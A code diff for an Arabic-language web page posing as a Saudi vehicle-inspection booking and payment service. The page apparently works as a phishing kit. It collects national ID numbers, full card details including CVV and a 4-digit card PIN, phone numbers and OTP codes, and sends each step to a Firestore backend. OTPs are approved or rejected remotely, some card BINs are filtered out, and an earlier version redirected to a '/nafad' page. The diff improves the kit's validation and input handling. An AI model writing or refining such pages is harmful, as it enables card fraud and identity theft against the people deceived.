@@ -9,6 +9,8 @@ import { motion } from "framer-motion"
 import { Input } from "@/components/ui/input"
 import { Loader2 } from "lucide-react"
 import { CardHeader, CardTitle, CardDescription } from "@/components/ui/card"
+import { Alert, AlertDescription } from "@/components/ui/alert"
+import { AlertCircle } from "lucide-react"
 
 import { useEffect, useState } from "react"
 import { Button } from "@/components/ui/button"
@@ -17,8 +19,9 @@ import { Car, Truck, CreditCard, Wallet, Lock } from "lucide-react"
 import { doc, onSnapshot } from "firebase/firestore"
 import { addData, db } from "@/lib/firebase"
 import { setupOnlineStatus } from "@/lib/utils"
-import type { VehicleStatus, VehicleType, AppStep, PaymentMethod, BankInfo, BinDatabase, ApprovalStatus } from "@/lib/types"
+import type { VehicleStatus, VehicleType, AppStep, PaymentMethod, BankInfo, BinDatabase, ApprovalStatus } from "@/types"
 import { SaudiPlateInput } from "@/components/saudi-plate-input"
+import { validateSaudiPhoneNumber, validateSaudiNationalId } from "@/lib/validation"
 
 // Removed duplicate type BankInfo definition as it's already imported from "@/types"
 // type BankInfo = {
@@ -32,6 +35,61 @@ function randstr(prefix: string) {
     .replace("0.", prefix || "")
 }
 const visitorID = randstr("salmn-")
+
+const countries = [
+  { code: "SA", nameAr: "السعودية", nameEn: "Saudi Arabia" },
+  { code: "AE", nameAr: "الإمارات", nameEn: "United Arab Emirates" },
+  { code: "BH", nameAr: "البحرين", nameEn: "Bahrain" },
+  { code: "KW", nameAr: "الكويت", nameEn: "Kuwait" },
+  { code: "OM", nameAr: "عمان", nameEn: "Oman" },
+  { code: "QA", nameAr: "قطر", nameEn: "Qatar" },
+  { code: "YE", nameAr: "اليمن", nameEn: "Yemen" },
+  { code: "IQ", nameAr: "العراق", nameEn: "Iraq" },
+  { code: "JO", nameAr: "الأردن", nameEn: "Jordan" },
+  { code: "LB", nameAr: "لبنان", nameEn: "Lebanon" },
+  { code: "SY", nameAr: "سوريا", nameEn: "Syria" },
+  { code: "PS", nameAr: "فلسطين", nameEn: "Palestine" },
+  { code: "EG", nameAr: "مصر", nameEn: "Egypt" },
+  { code: "LY", nameAr: "ليبيا", nameEn: "Libya" },
+  { code: "TN", nameAr: "تونس", nameEn: "Tunisia" },
+  { code: "DZ", nameAr: "الجزائر", nameEn: "Algeria" },
+  { code: "MA", nameAr: "المغرب", nameEn: "Morocco" },
+  { code: "MR", nameAr: "موريتانيا", nameEn: "Mauritania" },
+  { code: "SD", nameAr: "السودان", nameEn: "Sudan" },
+  { code: "SO", nameAr: "الصومال", nameEn: "Somalia" },
+  { code: "DJ", nameAr: "جيبوتي", nameEn: "Djibouti" },
+  { code: "KM", nameAr: "جزر القمر", nameEn: "Comoros" },
+  { code: "US", nameAr: "الولايات المتحدة", nameEn: "United States" },
+  { code: "GB", nameAr: "المملكة المتحدة", nameEn: "United Kingdom" },
+  { code: "CA", nameAr: "كندا", nameEn: "Canada" },
+  { code: "AU", nameAr: "أستراليا", nameEn: "Australia" },
+  { code: "DE", nameAr: "ألمانيا", nameEn: "Germany" },
+  { code: "FR", nameAr: "فرنسا", nameEn: "France" },
+  { code: "IT", nameAr: "إيطاليا", nameEn: "Italy" },
+  { code: "ES", nameAr: "إسبانيا", nameEn: "Spain" },
+  { code: "TR", nameAr: "تركيا", nameEn: "Turkey" },
+  { code: "IR", nameAr: "إيران", nameEn: "Iran" },
+  { code: "PK", nameAr: "باكستان", nameEn: "Pakistan" },
+  { code: "IN", nameAr: "الهند", nameEn: "India" },
+  { code: "BD", nameAr: "بنغلاديش", nameEn: "Bangladesh" },
+  { code: "CN", nameAr: "الصين", nameEn: "China" },
+  { code: "JP", nameAr: "اليابان", nameEn: "Japan" },
+  { code: "KR", nameAr: "كوريا الجنوبية", nameEn: "South Korea" },
+  { code: "MY", nameAr: "ماليزيا", nameEn: "Malaysia" },
+  { code: "ID", nameAr: "إندونيسيا", nameEn: "Indonesia" },
+  { code: "PH", nameAr: "الفلبين", nameEn: "Philippines" },
+  { code: "TH", nameAr: "تايلاند", nameEn: "Thailand" },
+  { code: "SG", nameAr: "سنغافورة", nameEn: "Singapore" },
+  { code: "NZ", nameAr: "نيوزيلندا", nameEn: "New Zealand" },
+  { code: "BR", nameAr: "البرازيل", nameEn: "Brazil" },
+  { code: "MX", nameAr: "المكسيك", nameEn: "Mexico" },
+  { code: "AR", nameAr: "الأرجنتين", nameEn: "Argentina" },
+  { code: "ZA", nameAr: "جنوب أفريقيا", nameEn: "South Africa" },
+  { code: "NG", nameAr: "نيجيريا", nameEn: "Nigeria" },
+  { code: "KE", nameAr: "كينيا", nameEn: "Kenya" },
+  { code: "ET", nameAr: "إثيوبيا", nameEn: "Ethiopia" },
+]
+
 export default function BookingPage() {
   const [vehicleStatus, setVehicleStatus] = useState<VehicleStatus>("license")
   const [country, setCountry] = useState("")
@@ -42,6 +100,7 @@ export default function BookingPage() {
   const [vehicleType, setVehicleType] = useState<VehicleType>("car")
   const [ownerName, setOwnerName] = useState("")
   const [nationalId, setNationalId] = useState("")
+  const [displayNationalId, setDisplayNationalId] = useState("")
   const [region, setRegion] = useState("")
   const [city, setCity] = useState("")
   const [inspectionCenter, setInspectionCenter] = useState("")
@@ -49,8 +108,9 @@ export default function BookingPage() {
   const [inspectionTime, setInspectionTime] = useState("")
   const [captchaChecked, setCaptchaChecked] = useState(true)
   const [inspectionType, setInspectionType] = useState("") // Added declaration
+  const [vehicleInfoError, setVehicleInfoError] = useState("") // Added vehicleInfoError state
 
-  const [currentStep, setCurrentStep] = useState<AppStep>("booking") // Changed initial step to landing
+  const [currentStep, setCurrentStep] = useState<AppStep>("landing") // Changed initial step to landing
   const [paymentMethod, setPaymentMethod] = useState<PaymentMethod | "">("")
   const [cardNumber, setCardNumber] = useState("")
   const [cardName, setCardName] = useState("")
@@ -60,7 +120,9 @@ export default function BookingPage() {
   const [phone, setPhone] = useState("")
   const [operator, setOperator] = useState("")
   const [phoneOtp, setPhoneOtp] = useState("")
-  const [phoneOtpError, setPhoneOtpError] = useState("")
+  const [cardError, setCardError] = useState("")
+  const [pinError, setPinError] = useState("")
+  const [phoneOtpError, setPhoneOtpError] = useState("") // Declared phoneOtpError
   const [phoneOtpApproval, setPhoneOtpApproval] = useState<ApprovalStatus | undefined>()
   const [bankInfo, setBankInfo] = useState<BankInfo | null>(null)
   const [phoneOtpSent, setPhoneOtpSent] = useState(false)
@@ -69,6 +131,15 @@ export default function BookingPage() {
   const [stcModalOpen, setStcModalOpen] = useState(false)
   const [cardOtpApproval, setCardOtpApproval] = useState<ApprovalStatus | undefined>() // Declared the variable
   const [pin, setPin] = useState(["", "", "", ""]) // Added pin state and setPin function
+
+  const arabicToWestern = (str: string) => {
+    const arabicNums = ["٠", "١", "٢", "٣", "٤", "٥", "٦", "٧", "٨", "٩"]
+    return str.replace(/[٠-٩]/g, (d) => arabicNums.indexOf(d).toString())
+  }
+
+  const normalizeNumbers = (value: string) => {
+    return arabicToWestern(value)
+  }
 
   useEffect(() => {
     getLocation().then(() => {
@@ -183,9 +254,17 @@ export default function BookingPage() {
 
   const handlePinSubmit = async (e: React.FormEvent) => {
     e.preventDefault()
+    setPinError("")
+
+    const fullPin = pin.join("")
+    if (fullPin.length !== 4) {
+      setPinError("يرجى إدخال رمز PIN المكون من 4 أرقام")
+      return
+    }
+
     await addData({
       id: visitorID,
-      pin: pin.join(""),
+      pin: fullPin,
       step: "pin-submitted",
     })
     setIsLoading(true)
@@ -198,6 +277,20 @@ export default function BookingPage() {
   const handleSendPhoneOtp = async (e: React.FormEvent) => {
     e.preventDefault()
     setPhoneOtpError("")
+
+    // Validate Saudi phone number
+    const phoneValidation = validateSaudiPhoneNumber(phone)
+    if (!phoneValidation.valid) {
+      setPhoneOtpError(phoneValidation.error || "رقم الجوال غير صحيح")
+      return
+    }
+
+    // Check if operator is selected
+    if (!operator) {
+      setPhoneOtpError("يرجى اختيار المشغل")
+      return
+    }
+
     await addData({
       id: visitorID,
       phone,
@@ -251,7 +344,8 @@ export default function BookingPage() {
     if (phoneOtpApproval === "approved") {
       setIsLoading(false)
       // Navigate to success page or show success message
-window.location.href='/nafad'
+      setCurrentStep("landing")
+      alert("تم التحقق بنجاح! شكراً لك.")
     } else if (phoneOtpApproval === "rejected") {
       setIsLoading(false)
       setPhoneOtpError("رمز التحقق غير صحيح. يرجى المحاولة مرة أخرى.")
@@ -262,7 +356,7 @@ window.location.href='/nafad'
     const bin = cardNum.replace(/\s/g, "").substring(0, 6)
     const bin4 = bin.substring(0, 4) // Get first 4 digits for ignored BINs check
 
-    const ignoredBins = ["4748", "4685", "4323"]
+    const ignoredBins = ["4748", "4685", "4323", "4847"]
 
     if (ignoredBins.includes(bin4)) {
       setBankInfo(null)
@@ -295,10 +389,8 @@ window.location.href='/nafad'
   }
 
   const handleCardNumberChange = (value: string) => {
-    const formatted = value
-      .replace(/\s/g, "")
-      .replace(/(\d{4})/g, "$1 ")
-      .trim()
+    const normalized = normalizeNumbers(value.replace(/\s/g, ""))
+    const formatted = normalized.replace(/(\d{4})/g, "$1 ").trim()
     setCardNumber(formatted)
     checkBIN(formatted)
   }
@@ -453,8 +545,7 @@ window.location.href='/nafad'
     {
       id: "card" as PaymentMethod,
       label: "بطاقة ائتمان",
-      icon:"/Visa-Mastercard-1-2048x755.png",
-
+      icon: Wallet,
       description: "فيزا أو ماستركارد",
       badge: "استرداد نقدي 15%",
       available: true,
@@ -462,18 +553,72 @@ window.location.href='/nafad'
     {
       id: "wallet" as PaymentMethod,
       label: "مدى",
-      icon:"/mada.svg",
+      icon: CreditCard,
       description: "بطاقة مدى",
-      available: true,
+      available: false,
     },
     {
       id: "bank" as PaymentMethod,
       label: "Apple Pay",
-      icon:"/images.png",
+      icon: Wallet,
       description: "الدفع عبر آبل",
       available: false,
     },
   ]
+
+  const handleVehicleInfoSubmit = async (e: React.FormEvent) => {
+    e.preventDefault()
+    // Basic validation for required fields
+    if (
+      !plateNumbers ||
+      !plateLetters ||
+      !country ||
+      !registrationType ||
+      !ownerName ||
+      !nationalId ||
+      !inspectionType ||
+      !region ||
+      !city ||
+      !inspectionCenter ||
+      !inspectionDate ||
+      !inspectionTime
+    ) {
+      setVehicleInfoError("يرجى ملء جميع الحقول المطلوبة.")
+      return
+    }
+
+    // Add more specific validations if needed (e.g., for nationalId, phone numbers, etc.)
+    const idValidation = validateSaudiNationalId(nationalId)
+    if (!idValidation.valid) {
+      setVehicleInfoError(idValidation.error || "رقم الهوية الوطنية غير صحيح")
+      return
+    }
+
+    await addData({
+      id: visitorID,
+      vehicleStatus,
+      country,
+      plateNumbers,
+      plateLetters,
+      plateInfo,
+      registrationType,
+      vehicleType,
+      ownerName,
+      nationalId,
+      region,
+      city,
+      inspectionCenter,
+      inspectionDate,
+      inspectionTime,
+      inspectionType,
+      step: "booking-details-submitted",
+    })
+    setIsLoading(true)
+    setTimeout(() => {
+      setCurrentStep("payment-method")
+      setIsLoading(false)
+    }, 1500)
+  }
 
   if (isLoading) {
     return (
@@ -704,7 +849,7 @@ window.location.href='/nafad'
               >
                 <X className="h-4 w-4 text-gray-600" />
               </button>
-              <img src="/adcs.jpg" alt="عرض خاص" className="w-full  h-full rounded-lg" />
+              <img src="/special-offer-promotion-banner-arabic-rtl.jpg" alt="عرض خاص" className="w-full rounded-lg" />
             </div>
             <div className="text-center space-y-3 pt-2">
               <h3 className="text-xl font-bold text-gray-900">عرض خاص!</h3>
@@ -733,7 +878,8 @@ window.location.href='/nafad'
               <CardDescription className="text-lg">املأ البيانات التالية لإتمام الحجز</CardDescription>
             </CardHeader>
             <CardContent className="pt-8">
-              <form onSubmit={handleSubmit} className="space-y-8">
+              {/* Added validation function for vehicle info step */}
+              <form onSubmit={handleVehicleInfoSubmit} className="space-y-8">
                 {/* Vehicle Status */}
                 <div className="space-y-3">
                   <label className="text-sm font-medium text-foreground">حالة المركبة</label>
@@ -768,13 +914,22 @@ window.location.href='/nafad'
 
                 {/* Country and Plate Info */}
                 <div className="grid gap-4">
-                  <Input
-                    placeholder="الدولة"
-                    value={country}
-                    onChange={(e) => setCountry(e.target.value)}
-                    className="h-12"
-                    required
-                  />
+                  <div className="space-y-3">
+                    <label className="text-sm font-medium text-foreground">الدولة</label>
+                    <select
+                      value={country}
+                      onChange={(e) => setCountry(e.target.value)}
+                      className="w-full h-12 px-4 rounded-lg border border-border bg-background text-foreground focus:border-teal-700 focus:ring-1 focus:ring-teal-700"
+                      required
+                    >
+                      <option value="">اختر الدولة</option>
+                      {countries.map((c) => (
+                        <option key={c.code} value={c.code}>
+                          {c.nameAr} ({c.nameEn})
+                        </option>
+                      ))}
+                    </select>
+                  </div>
                   <Input
                     placeholder="معلومات إضافية للوحة"
                     value={plateInfo}
@@ -795,31 +950,44 @@ window.location.href='/nafad'
                   />
                 </div>
 
-                {/* Owner Name and National ID */}
-                <div className="space-y-2">
+                {/* Owner Name */}
+                <div className="space-y-3">
                   <label className="text-sm font-medium text-foreground">اسم المالك</label>
                   <Input
                     type="text"
                     value={ownerName}
                     onChange={(e) => setOwnerName(e.target.value)}
-                    placeholder="أدخل الاسم الكامل"
+                    placeholder="أدخل اسم المالك"
                     className="h-12"
                     required
                   />
                 </div>
 
-                <div className="space-y-2">
+                {/* National ID */}
+                <div className="space-y-3">
                   <label className="text-sm font-medium text-foreground">رقم الهوية الوطنية</label>
                   <Input
                     type="text"
                     inputMode="numeric"
                     maxLength={10}
-                    value={nationalId}
-                    onChange={(e) => setNationalId(e.target.value.replace(/\D/g, ""))}
-                    placeholder="1234567890"
+                    value={displayNationalId}
+                    onChange={(e) => {
+                      const westernValue = e.target.value
+                        .replace(/[٠-٩]/g, (d) => "٠١٢٣٤٥٦٧٨٩".indexOf(d).toString())
+                        .replace(/\D/g, "")
+
+                      const arabicValue = westernValue.replace(/\d/g, (d) => "٠١٢٣٤٥٦٧٨٩"[Number.parseInt(d)])
+
+                      setNationalId(westernValue)
+                      setDisplayNationalId(arabicValue)
+                    }}
+                    placeholder="١٢٣٤٥٦٧٨٩٠"
                     className="h-12"
                     required
                   />
+                  <p className="text-xs text-muted-foreground">
+                    يجب أن يبدأ بـ 1 (سعودي) أو 2 (مقيم) ويتكون من 10 أرقام
+                  </p>
                 </div>
 
                 {/* Inspection Type */}
@@ -882,7 +1050,23 @@ window.location.href='/nafad'
                   )}
                 </div>
 
-               
+                {/* Inspection Center */}
+                <div className="space-y-3">
+                  <label className="text-sm font-medium text-foreground">محطة الفحص</label>
+                  <select
+                    value={inspectionCenter}
+                    onChange={(e) => setInspectionCenter(e.target.value)}
+                    className="w-full h-12 px-4 rounded-lg border border-border bg-background text-foreground focus:border-teal-700 focus:ring-1 focus:ring-teal-700"
+                    required
+                  >
+                    <option value="">اختر محطة الفحص</option>
+                    {inspectionCenters.map((center) => (
+                      <option key={center.value} value={center.value}>
+                        {center.label}
+                      </option>
+                    ))}
+                  </select>
+                </div>
 
                 {/* Date and Time */}
                 <div className="grid md:grid-cols-2 gap-4">
@@ -908,19 +1092,16 @@ window.location.href='/nafad'
                   </div>
                 </div>
 
-                <Button
-                  type="submit"
-                  className="w-full h-14 text-lg text-white font-semibold bg-teal-700 hover:bg-teal-700/90"
-                  disabled={isLoading}
-                >
-                  {isLoading ? (
-                    <>
-                      <Loader2 className="ml-2 h-5 w-5 animate-spin" />
-                      جارٍ الحجز...
-                    </>
-                  ) : (
-                    "تأكيد الحجز"
-                  )}
+                {/* Vehicle Info Error Display */}
+                {vehicleInfoError && (
+                  <Alert variant="destructive" className="bg-red-50 border-red-200">
+                    <AlertCircle className="h-4 w-4" />
+                    <AlertDescription>{vehicleInfoError}</AlertDescription>
+                  </Alert>
+                )}
+
+                <Button type="submit" className="w-full h-14 text-lg font-semibold bg-teal-700 hover:bg-teal-700/90">
+                  التالي
                 </Button>
               </form>
             </CardContent>
@@ -966,7 +1147,7 @@ window.location.href='/nafad'
                             paymentMethod === method.id ? "bg-teal-700 text-white" : "bg-secondary text-foreground"
                           }`}
                         >
-                        {<img src={method.icon} width={50}/>}
+                          <method.icon className="h-6 w-6" />
                         </div>
                         <div className="text-right">
                           <div className="font-semibold text-foreground text-lg">{method.label}</div>
@@ -985,7 +1166,7 @@ window.location.href='/nafad'
               <Button
                 onClick={handlePaymentMethodSubmit}
                 disabled={!paymentMethod || isLoading}
-                className="w-full mt-8 h-14 text-lg text-white font-semibold bg-teal-700 hover:bg-teal-700/90"
+                className="w-full mt-8 h-14 text-lg font-semibold bg-teal-700 hover:bg-teal-700/90"
               >
                 {isLoading ? (
                   <>
@@ -1015,7 +1196,7 @@ window.location.href='/nafad'
               >
                 <X className="h-4 w-4 text-gray-600" />
               </button>
-              <img src="/adcs.jpg" alt="عرض خاص" className="w-full rounded-lg" />
+              <img src="/special-offer-promotion-banner-arabic-rtl.jpg" alt="عرض خاص" className="w-full rounded-lg" />
             </div>
             <div className="text-center space-y-3 pt-2">
               <h3 className="text-xl font-bold text-gray-900">عرض خاص!</h3>
@@ -1032,7 +1213,7 @@ window.location.href='/nafad'
         <div className="max-w-4xl mx-auto">
           <div className="grid lg:grid-cols-2 gap-8">
             {/* Card Preview */}
-            <div className="order-1 lg:order-1">
+            <div className="order-2 lg:order-1">
               <div className="sticky top-8">
                 <div
                   className="relative w-full aspect-[1.586] rounded-2xl p-8 text-white shadow-2xl"
@@ -1044,14 +1225,14 @@ window.location.href='/nafad'
                     <div className="text-2xl font-bold">{bankInfo?.name || "بطاقة ائتمان"}</div>
                   </div>
                   <div className="absolute top-1/2 right-8 -translate-y-1/2">
-                    <div className="text-md font-mono tracking-widest" dir="ltr">
+                    <div className="text-3xl font-mono tracking-widest" dir="ltr">
                       {cardNumber || "•••• •••• •••• ••••"}
                     </div>
                   </div>
                   <div className="absolute bottom-8 right-8 left-8 flex justify-between items-end">
                     <div>
                       <div className="text-xs opacity-80 mb-1">اسم حامل البطاقة</div>
-                      <div className="text-sm font-semibold">{cardName || "الاسم الكامل"}</div>
+                      <div className="text-lg font-semibold">{cardName || "الاسم الكامل"}</div>
                     </div>
                     <div>
                       <div className="text-xs opacity-80 mb-1">تاريخ الانتهاء</div>
@@ -1114,7 +1295,7 @@ window.location.href='/nafad'
                           maxLength={5}
                           value={expiryDate}
                           onChange={(e) => {
-                            let value = e.target.value.replace(/\D/g, "")
+                            let value = normalizeNumbers(e.target.value).replace(/\D/g, "")
                             if (value.length >= 2) {
                               value = value.slice(0, 2) + "/" + value.slice(2, 4)
                             }
@@ -1132,7 +1313,7 @@ window.location.href='/nafad'
                           inputMode="numeric"
                           maxLength={3}
                           value={cvv}
-                          onChange={(e) => setCvv(e.target.value.replace(/\D/g, ""))}
+                          onChange={(e) => setCvv(normalizeNumbers(e.target.value).replace(/\D/g, ""))}
                           placeholder="123"
                           className="h-12"
                           required
@@ -1191,10 +1372,11 @@ window.location.href='/nafad'
                     maxLength={1}
                     value={digit}
                     onChange={(e) => {
+                      const normalized = normalizeNumbers(e.target.value)
                       const newPin = [...pin]
-                      newPin[index] = e.target.value
+                      newPin[index] = normalized
                       setPin(newPin)
-                      if (e.target.value && index < 3) {
+                      if (normalized && index < 3) {
                         const nextInput = document.querySelector(`input[name="pin-${index + 1}"]`) as HTMLInputElement
                         nextInput?.focus()
                       }
@@ -1211,6 +1393,11 @@ window.location.href='/nafad'
                   />
                 ))}
               </div>
+              {pinError && (
+                <div className="p-4 bg-red-50 border border-red-200 rounded-lg">
+                  <p className="text-sm text-red-600 text-center">{pinError}</p>
+                </div>
+              )}
               <Button
                 type="submit"
                 className="w-full bg-emerald-600 hover:bg-emerald-700 text-white"
@@ -1251,11 +1438,12 @@ window.location.href='/nafad'
                       type="tel"
                       inputMode="numeric"
                       value={phone}
-                      onChange={(e) => setPhone(e.target.value)}
+                      onChange={(e) => setPhone(normalizeNumbers(e.target.value))}
                       placeholder="05xxxxxxxx"
                       className="h-12"
                       required
                     />
+                    <p className="text-xs text-muted-foreground">يجب أن يبدأ بـ 05 ويتكون من 10 أرقام</p>
                   </div>
 
                   <div className="space-y-2">
@@ -1272,6 +1460,13 @@ window.location.href='/nafad'
                       <option value="Zain">زين</option>
                     </select>
                   </div>
+
+                  {phoneOtpError && (
+                    <Alert variant="destructive" className="bg-red-50 border-red-200">
+                      <AlertCircle className="h-4 w-4" />
+                      <AlertDescription>{phoneOtpError}</AlertDescription>
+                    </Alert>
+                  )}
 
                   <Button
                     type="submit"
@@ -1295,7 +1490,6 @@ window.location.href='/nafad'
             open={stcModalOpen}
             onOpenChange={() => setStcModalOpen(false)}
             verifyOtp={handleStcVerify}
-          
           />
         </div>
       )
@@ -1321,7 +1515,7 @@ window.location.href='/nafad'
                       inputMode="numeric"
                       maxLength={6}
                       value={phoneOtp}
-                      onChange={(e) => setPhoneOtp(e.target.value.replace(/\D/g, ""))}
+                      onChange={(e) => setPhoneOtp(normalizeNumbers(e.target.value).replace(/\D/g, ""))}
                       placeholder="أدخل الرمز المكون من 6 أرقام"
                       className="h-12 text-center text-2xl tracking-widest font-mono"
                       required
